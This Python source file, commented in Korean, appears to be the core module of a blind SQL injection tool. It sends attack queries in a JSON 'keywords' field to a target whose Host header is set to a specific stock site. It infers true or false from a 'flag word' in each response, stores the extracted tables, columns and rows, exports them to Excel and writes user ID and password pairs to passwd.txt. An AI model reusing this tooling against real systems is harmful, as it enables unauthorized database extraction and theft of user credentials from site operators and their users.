import requests
import pandas as pd


class attackData:
    def __init__(self):
        self.base_url = ""
        self.cookies = { "JSESSIONID": "" }
        self.headers = {'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
                        'Host': 'www.rookiestock.com'}
        self.DB_type = "mysql"

        self.data = {
            'keywords': ""}
        self.query = ""
        self.flag_word = "true"

        

    def show(self):
        print(f"\nbase URL = {self.base_url}")
        print(f"SessionID = {self.cookies['JSESSIONID']}")
        print(f"Attack Query : {self.data['keywords']}")
        print(f"Flag word = {self.flag_word}")

    def set_url(self,new_url):
        self.base_url = new_url

    def set_query(self,attack_query):
        self.data['keywords'] = attack_query

    def set_cookies(self,cookie):
        self.cookies = cookie
    
    def set_sessionID(self,sessionID):
        self.cookies['JSESSIONID'] = sessionID
    
    def set_flag_word(self,word):
        self.flag_word = word
    
    def set_DB_type(self,type):
        self.DB_type = type

    def send_get_request(self,url):
        #요청 보내기
        res = requests.get(url, cookies=self.cookies)
        if '권한' in res.text:
            print("세션 ID 교체") 
            return False
        elif self.flag_word in res.text:
            return False
        else:
            return True
        
    def send_post_request(self,request_string=""):
        #요청 보내기

        if(request_string != ""):
            self.set_query(request_string)

        res = requests.post(self.base_url, cookies=self.cookies, json=self.data, headers=self.headers)
        
        #print(res.text)
        if self.flag_word in res.text:
            return True
        else:
            return False
        
class tableInfo:
    def __init__(self):
        self.tables=[]
        self.columns={}
        self.datas={}

    def append_table(self,table):
        self.tables.append(table)
        self.columns[table]=[]
        self.datas[table]={}

    def append_column(self,table_name,column_name):
        self.columns[table_name].append(column_name)
        self.datas[table_name][column_name]=[]
        

    def append_datas(self,table_name,column_name,data):
        self.datas[table_name][column_name].append(data)
    
    def get_counts(self,type):
        if type=='table':
            return self.table_count
        
        elif type=='column':
            return self.column_counts
        
        elif type=='data':
            return self.data_counts
    def show_tables(self):
        print(f'\ntable = {self.tables}')
    
    def show_columns(self):
        for key in self.columns:
            print(f"{key}")
            print("-"*20)
            print(f"{self.columns[key]}\n")


    def show_data(self,table_name):
        
        data = self.datas[table_name]

        keys = list(data.keys())
        num_rows = len(data[keys[0]])

        print()
        print(f'table = {table_name}')
        # Print header
        max_lens = 15
        header = ' | '.join(f'{key:<{max_lens}}' for i, key in enumerate(keys))
        print(header)
        print('-' * (max_lens *6))

        # Print data
        for i in range(num_rows):
            row = ' | '.join(f'{data[key][i]:<{max_lens}}' for j, key in enumerate(keys))
            print(row)

    def export_data_xlsx(self):
        dfs = []
        for table, columns in self.columns.items():
            df = pd.DataFrame(self.datas[table], columns=columns)
            dfs.append(df)

        # Excel 파일로 내보내기
        with pd.ExcelWriter('output.xlsx') as writer:
            for i, table in enumerate(self.tables):
                dfs[i].to_excel(writer, sheet_name=table, index=False)

    def export_passwd(self):
        # xlsx 파일 읽기
        df = pd.read_excel('output.xlsx')

        # 필요한 열만 추출
        df_selected = df[['USER_ID', 'USER_PW']]

        # txt 파일로 저장
        with open('passwd.txt', 'w') as f:
            for index, row in df_selected.iterrows():
                user_nm = str(row['USER_ID'])
                user_pw = str(row['USER_PW'])
                f.write(f"{user_nm}:{user_pw}\n")



            






    

